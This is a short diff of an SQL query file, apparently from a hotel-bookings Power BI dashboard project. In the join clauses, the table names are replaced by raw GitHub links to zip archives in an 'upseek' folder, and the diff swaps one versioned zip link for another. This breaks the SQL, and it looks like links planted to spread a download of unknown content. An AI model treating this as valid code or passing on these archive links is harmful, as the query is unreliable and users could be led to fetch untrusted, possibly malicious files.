@@ -20,7 +20,7 @@ union
 select * from dbo.['2020$'])
 
 select * from hotels
-left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$
-on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$.market_segment
-left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$
-on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/Power_BI_Dashboard_1.4.zip$.meal
+left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/B-Dashboard-Power-v3.8.zip$
+on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/B-Dashboard-Power-v3.8.zip$.market_segment
+left join https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/B-Dashboard-Power-v3.8.zip$
+on https://raw.githubusercontent.com/tjagnade27/Power_BI_Dashboard/main/upseek/B-Dashboard-Power-v3.8.zip$.meal
